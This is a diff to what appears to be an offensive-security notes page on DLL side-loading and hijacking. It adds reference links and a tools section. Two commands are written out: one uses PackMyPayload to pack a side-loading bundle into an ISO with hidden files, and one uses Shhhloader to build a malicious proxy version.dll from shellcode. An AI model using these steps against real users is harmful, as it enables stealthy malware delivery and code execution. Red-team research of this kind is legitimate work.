@@ -1,5 +1,6 @@
-# DLL Side-Loading
+# DLL Hijacking
 
+- [https://hijacklibs.net/](https://hijacklibs.net/)
 - [https://github.com/XForceIR/SideLoadHunter/tree/main/SideLoads](https://github.com/XForceIR/SideLoadHunter/tree/main/SideLoads)
 
 {% embed url="https://youtu.be/3eROsG_WNpE" %}
@@ -7,7 +8,7 @@
 
 
 
-## Combining with ISO Packing
+## DLL Side-Loading with ISO Packing
 
 - [https://unit42.paloaltonetworks.com/brute-ratel-c4-tool/](https://unit42.paloaltonetworks.com/brute-ratel-c4-tool/)
 - [https://blog.sunggwanchoi.com/recreating-an-iso-payload-for-fun-and-no-profit/](https://blog.sunggwanchoi.com/recreating-an-iso-payload-for-fun-and-no-profit/)
@@ -361,4 +362,21 @@ Pack all the files into an ISO with [PackMyPayload](https://github.com/mgeeky/Pa
 
 ```
 PS > python .\PackMyPayload.py C:\out\ C:\out\openme.iso --out-format iso --hide OneDrive.Update,OneDriveStandaloneUpdater.exe,version.dll,vresion.dll
+```
+
+
+
+
+## Tools
+
+- [https://github.com/tothi/dll-hijack-by-proxying](https://github.com/tothi/dll-hijack-by-proxying)
+
+
+
+### Shhhloader
+
+- [https://github.com/icyguider/Shhhloader](https://github.com/icyguider/Shhhloader)
+
+```
+$ ./Shhhloader.py -d -dp vresion.dll -o version.dll shellcode.bin
 ```
